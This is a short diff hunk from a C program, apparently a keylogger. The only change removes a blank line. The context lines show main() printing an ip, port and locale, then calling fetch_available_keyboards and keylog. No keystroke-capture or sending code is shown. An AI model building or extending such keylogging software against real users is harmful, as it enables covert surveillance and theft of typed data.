@@ -20,7 +20,6 @@ int main(int ac, char **av) {
         instance.ip, instance.port, instance.locale
     );
 
-
     fetch_available_keyboards(&instance);
     keylog(&instance);
     return 0;
